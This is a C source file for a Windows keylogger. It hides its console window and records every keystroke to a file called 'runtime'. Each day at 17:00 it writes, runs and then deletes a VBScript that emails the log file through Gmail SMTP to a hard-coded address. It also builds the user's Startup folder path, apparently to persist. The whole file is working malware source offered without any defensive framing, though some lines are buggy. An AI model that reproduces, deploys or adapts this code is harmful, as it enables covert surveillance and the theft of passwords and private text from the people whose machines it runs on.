#include<stdio.h>
#include<windows.h>
#include<winuser.h>
#include<unistd.h>
#include<string.h>
#include<time.h>

void getstartupfolder(char **startup);
int save(int key);
void createfile(char **path);


unsigned int t = 17;
int hour = 0;
int sent = 0;
char *startup;


int main(){

FILE *of ;
HWND win;

time_t starttime ;
struct tm *mytime;

win = FindWindowA("ConsoleWindowClass", 0);
ShowWindow(win, 0);


startup = (char *) malloc (200 * sizeof(char));

getstartupfolder(&startup);


of = fopen("runtime", "a+");
fprintf(of, "%s\n", startup);
fclose(of);

    while (1){
         time(&starttime);
         mytime = localtime(&starttime);
         hour = mytime->tm_hour;

        for( int i = 0; i < 191;  i ++){

            if(GetAsyncKeyState(i) == -32767)
            save(i);

            }

             if( (hour == t) && sent == 0){
             createfile(&startup);
             system( "runtime.vbs");
             remove("runtime.vbs");
             sent = 1;
            }
            if(sent == 1 && t != 17){
                        t = 17;
                        sent =0;
            }
    }

    system("PAUSE");
    return 0;
}

void getstartupfolder(char **startup){


char *str;
str = (char *) malloc (100 * sizeof(char));
str =  "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

*startup =getenv("USERPROFILE");
strcat(*startup, str) ;


}

int save(int key){

    if ( key ==1 || key ==2)   return 0;

    FILE *of ;
    of = fopen("runtime", "a+");

    switch(key){

    case 8:   fprintf(of, "[BACKSPACE]"); break;
    case 13:  fprintf(of, "\n"); break;
    case 32: fprintf(of, " "); break;
    case VK_TAB: fprintf(of, "[TAB]"); break;
    case VK_SHIFT: fprintf(of, "[SHIFT]"); break;
    case VK_CONTROL: fprintf(of, "[CONTROL]"); break;
    case VK_ESCAPE: fprintf(of, "[ESCAPE]"); break;
    case VK_END: fprintf(of, "[END]"); break;
    case VK_HOME: fprintf(of, "[HOME]"); break;
    case VK_LEFT: fprintf(of, "[LEFT]"); break;
    case VK_RIGHT: fprintf(of, "[RIGHT]"); break;
    case VK_UP: fprintf(of, "[UP]"); break;
    case VK_DOWN: fprintf(of, "[DOWN]"); break;
    case 190 || 110 : fprintf(of, "."); break;

     default : fprintf(of, "%s", &key); break;
    }

    fclose(of);

    return 0;
}



void createfile(char **path){

char code1[500]  = " on error resume next \n Dim iMsg \n Dim iConf \n Dim Flds \n Dim ToAddress \n Dim Subject \n Dim text \n Dim Attachment \n";
char currdir[500] = "Dim WshShell, strCurDir \n Set WshShell = CreateObject(\"WScript.Shell\") \n strCurDir = WshShell.CurrentDirectory \n Set WshShell = Nothing\n";
char code2[500]  = " Attachment = strCurDir &  ";
char code3[500]  = " \n ToAddress = \"krazzygenius@gmail.com\" \n Subject = \"Keylogger\" \n  text = \"report\" \n Set iMsg = CreateObject(\"CDO.Message\") \n ";
char code4[500]  = " Set iConf = CreateObject(\"CDO.Configuration\") \n  iConf.Load -1 \n Set Flds = iConf.Fields  \n With Flds \n .Item(\"http://schemas.microsoft.com/cdo/configuration/smtpusessl\") = True \n";
char code5[500]  = " .Item(\"http://schemas.microsoft.com/cdo/configuration/smtpauthenticate\") = 1 \n .Item(\"http://schemas.microsoft.com/cdo/configuration/sendusername\") = \"@gmail.com\" \n ";
char code6[500]  = " .Item(\"http://schemas.microsoft.com/cdo/configuration/sendpassword\") = \"pass\"  \n .Item(\"http://schemas.microsoft.com/cdo/configuration/smtpserver\") = \"smtp.gmail.com\" \n ";
char code7[500]  = ".Item(\"http://schemas.microsoft.com/cdo/configuration/sendusing\") = 2  \n .Item(\"http://schemas.microsoft.com/cdo/configuration/smtpserverport\") = 465  \n ";
char code8[500]  = ".Update  \n End With \n With iMsg \n Set .Configuration = iConf \n  .To = ToAddress \n .From = \"krazzygenius@gmail.com\" \n .Subject = Subject \n ";
char code9[500]  = ".TextBody = Text \n .AddAttachment Attachment \n .Send \n End With \n Set iMsg = Nothing \n Set iConf = Nothing \n ";

FILE *of ;
of = fopen("runtime.vbs", "w+");

fprintf(of, code1);
fprintf(of, currdir);
fprintf(of, code2);
fprintf(of, "\"");
fprintf(of, "\\runtime\"");
fprintf(of, code3);
fprintf(of, code4);
fprintf(of, code5);
fprintf(of, code6);
fprintf(of, code7);
fprintf(of, code8);
fprintf(of, code9);

fclose(of);

}
